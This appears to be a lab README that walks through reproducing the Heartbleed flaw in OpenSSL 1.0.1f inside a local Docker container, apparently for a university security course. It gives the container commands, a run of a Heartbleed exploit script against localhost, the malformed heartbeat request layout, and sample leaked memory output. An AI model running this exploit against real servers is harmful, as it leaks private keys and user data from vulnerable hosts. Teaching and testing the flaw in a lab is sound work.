## 1. Build the vulnerable container containing openssl 1.0.1f
```bash
docker build -t exploit-ssl:1.0.1f .
```

## 2. Run the container with port forwarding to 443
```bash
docker run -it --rm -p 443:443 --name openssl_vuln_container exploit-ssl:1.0.1f
```

*stop and remove the container (if you mess up)*
```bash
docker stop openssl_vuln_container
docker rm openssl_vuln_container
```

## 3. Exploit vulnerability of SSL
- check if ssl server is currently running
```bash
echo -ne "HEAD / HTTP/1.0\r\nHost: 127.0.0.1\r\nContent-Length: 4000\r\n\r\n" | openssl s_client -connect 127.0.0.1:443 -tlsextdebug
```
Run the vulnerability exploit
```bash
python3 simpleHeartbleedExploit.py 127.0.0.1 -p 443
```

*Heartbleed request format
```bash
|  Type  |  TLS Version  |   Length  |   Payload   |  Padding  |
|--------|---------------|-----------|-------------|-----------|
|  0x18  |   0x03 0x01   | 0x00 0x03 |  0x01 0x40  |   0x00    |
```

Example results:
```bash
python3 simpleHeartbleedExploit.py 127.0.0.1 -p 443
b'\x02\x00\x00>\x03\x02\xcfp_\x921j\xc8\xab\xfcJ\x97\xc4o22\r7O\xa5\xea\x1fneh\x9f\x8d:\xe9\xba\x06TZ\x00\xc0\x14\x00\x00\x16\xff\x01\x00\x01\x00\x00\x0b\x00\x04\x03\x00\x01\x02\x00#\x00\x00\x00\x0f\x00\x01\x01\x16\x03\x02\x03\xfd\x0b\x00\x03\xf9\x00\x03\xf6\x00\x03\xf30\x82\x03\xef0\x82\x02\xd7\xa0\x03\x02\x01\x02\x02\t\x00\x8f6\xe7\x84ARv\x110\r\x06\t*\x86H\x86\xf7\r\x01\x01\x05\x05\x000\x81\x8d1\x0b0\t\x06\x03U\x04\x06\x13\x02SG1\x120\x10\x06\x03U\x04\x08\x0c\tSingapore1\x120\x10\x06\x03U\x04\x07\x0c\tSingapore1\x0c0\n\x06\x03U\x04\n\x0c\x03NTU1\x0f0\r\x06\x03U\x04\x0b\x0c\x06SC30101\x130\x11\x06\x03U\x04\x03\x0c\nheartbleed1"0 \x06\t*\x86H\x86\xf7\r\x01\t\x01\x16\x13heartbleed@demo.com0\x1e\x17\r241027194411Z\x17\r251027194411Z0\x81\x8d1\x0b0\t\x06\x03U\x04\x06\x13\x02SG1\x120\x10\x06\x03U\x04\x08\x0c\tSingapore1\x120\x10\x06\x03U\x04\x07\x0c\tSingapore1\x0c0\n\x06\x03U\x04\n\x0c\x03NTU1\x0f0\r\x06\x03U\x04\x0b\x0c\x06SC30101\x130\x11\x06\x03U\x04\x03\x0c\nheartbleed1"0 \x06\t*\x86H\x86\xf7\r\x01\t\x01\x16\x13heartbleed@demo.com0\x82\x01"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x01\x0f\x000\x82\x01\n\x02\x82\x01\x01\x00\xae\x01\x11\xd8:\xd3\x9c\xafR\xf8>\xf0o\xfbzP\x19\x99$\xa2\xc2\xee\xe3PvS\r\xa2\x0f\xbf\xfc);\xd6w\xb78\xaev\thX\xa6\xd8\xec\xb0\xcb\x9c\xde\xb80(\xd1Ga\xda\xee\xd7\xa7\xe5PJ\x08\x16\xe3O\xb0\x1bq\x00\xb6]\x18\xb7\xdbGb\x06L\xfd.\x1f\xaa\xb7s\'\xc6p\xb3\xa0\xb9!\xab\x9fK\xf8Ue\x80\x8di\x9f?\xf2\xa2\x0f\xe3=\x1c\x8a\x89\xfb(o(p\xf3\x18\xa0s\xb5\x88\xe6\xd9\xb6\xe5A0\x8e\x07-\xa8\x812\xc1\xfa\xfa\x97\xc4\x9f_,of\xe6\x94!6\x80nI\xd2\x19>8.\x89\xe3\x11\x03\x02\xf9\x06K\xe8$B\xdf\x18.\xc0\x92!\x97\x1c\x96KO2\xad\xf3\x882\xaf\xfd\x85\xd3zp\x14|p\xf4\tW\x9f+\xa6\xd7%\x9f\\\xf9\x93\xd7B\xfd\xc3\x93\xe8\xc2Y\xe3\xec\x93\x0c\x04\x88\xd7\x1c\xc5\x135\x85\xdb\x9d;\x0f\xfa\xf5m\xfa\x9b^W&\xee\xa5^\xddN0@\x1213\xb0T\x03W\xb2\x99\xdc\xbel\xab\x02\x03\x01\x00\x01\xa3P0N0\x1d\x06\x03U\x1d\x0e\x04\x16\x04\x14\xa8xU-\xa7\xb07#Q\xb3\x8e\xcaHv\xa4\xd36\x8f\x99\x9f0\x1f\x06\x03U\x1d#\x04\x180\x16\x80\x14\xa8xU-\xa7\xb07#Q\xb3\x8e\xcaHv\xa4\xd36\x8f\x99\x9f0\x0c\x06\x03U\x1d\x13\x04\x050\x03\x01\x01\xff0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x05\x05\x00\x03\x82\x01\x01\x00ww\xbe\x0c\x10\xffn#\xad\x96\xab\xe9\xea\xf2\x8d8\x01A\xd9\xf9\x80\xcc\xfe\xf5j\x80e\x17\xfc~?\x90\x90\xf1\xf3@-\x14)\xea\xc8\xa3`\x93\xa5\x08T\x16K\x06\xa1\x9c\xbb\xb2\xf0\xb1\xb2/\xb24u\xedr\x0b\xbc\xc6_b\x02\xa2\xdd8\x14=\x8d\xf5\x1e\xeai[$2P\x87\n\x19\xf0\x04\xd8c\xbc\x95\xc4\x12\x9b\xfe\x80\x98\x14Az|\xe0Qi@-\xd3\xc9B\xc7\x1f\xe63-\xb7\xdf\xb3J\x93\xa3\x93J8\xce h\xd7/\xa0\xe4h\x0b\xa18,\x83T\xb0\xc1\x8b\xde:8\\3ub\xdaC\xa3\xc6\xfav\xceQ\x7f\xaez)\xa3\x15\xf5\xe6\x1b\x0b\xd6\xf8\x18\xb7\x00\xfa\x83XV3\xbe\xa9\xbd\xda]\xf1\x7f\xea\x8b\x9c\xf2\xd1'
Vulnerable: Server returned 1024 bytes
Host 127.0.0.1 appears to be VULNERABLE!
```